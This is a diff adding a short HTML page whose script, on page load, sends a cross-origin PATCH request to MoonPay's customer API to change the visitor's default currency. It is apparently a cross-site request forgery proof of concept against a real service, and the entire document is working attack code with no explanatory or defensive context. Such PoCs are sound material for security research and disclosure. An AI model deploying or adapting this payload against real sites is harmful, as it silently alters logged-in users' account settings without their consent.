@@ -1,0 +1,11 @@
+<script>
+    function patch() {
+        var x = new XMLHttpRequest();
+        x.open("PATCH", "https://api.moonpay.com/v3/customers/me/", true);
+        x.setRequestHeader("Content-Type", "application/json");
+        x.send(JSON.stringify({
+            "defaultCurrencyId": "71435a8d-211c-4664-a59e-2a5361a6c5a7"
+        }));
+    }
+</script>
+<body onload="patch()">
